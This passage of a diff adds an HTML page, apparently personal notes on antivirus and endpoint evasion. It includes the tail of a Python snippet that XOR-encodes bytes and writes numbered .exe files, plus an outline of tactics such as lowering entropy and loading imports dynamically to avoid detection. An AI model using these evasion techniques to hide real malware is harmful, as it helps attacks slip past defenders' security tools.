+  current[i] = chr(ord(current[i]) ^ 0xde)
+  path = "%d.exe" % i
+  
+  output = "".join(str(e) for e in current)
+  open(path, "wb").write(output)
+  i += 1
+  
+print("done")</code></pre></li>
+                            </ul>
+                            <li>Entropy</li>
+                            <ul>
+                              <li>To lower entropy, we can replace random identifiers with randomly selected English words.</li>
+                            </ul>
+                          </ul>
+                          <li>Behavioral</li>
+                          <ul>
+                            <li>Observing Imports</li>
+                            <ul>
+                              <li>Use dynamic loading</li>
+                              <ol>
+                                <li>Define the structure of the call</li>
+                                <li>Obtain the handle of the module the call address is present in</li>
+                                <li>Obtain the process address of the call</li>
+                                <li>Use the newly created call</li>
+                              </ol>
+                            </ul>
+                            <li>Hooking Malicious Calls</li>
+                          </ul>
+                        </ul>
+                      </div>
+                      <h4>Runtime Detection</h4>
+                      <div></div>
+                      <h4>Logging and Monitoring</h4>
+                      <div></div>
+                    </div>
+                    <h2>Network</h2>
+                    <h3>Security Solutions</h3>
+                    <div>
+                      <h4>Firewalls</h4>
+                      <div></div>
+                      <h4>Sandbox</h4>
+                      <div></div>
+                    </div>
+                  </div>
+                </article>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footer border"></div>
+      </div>
+      <script src=
+      "https://eli2k.com/resources/js/themeSwitch.js"></script>
+      <script src=
+      "https://eli2k.com/resources/js/collapseList.js"></script>
+      
+    </div>
+  </div>
+</body>
+</html>
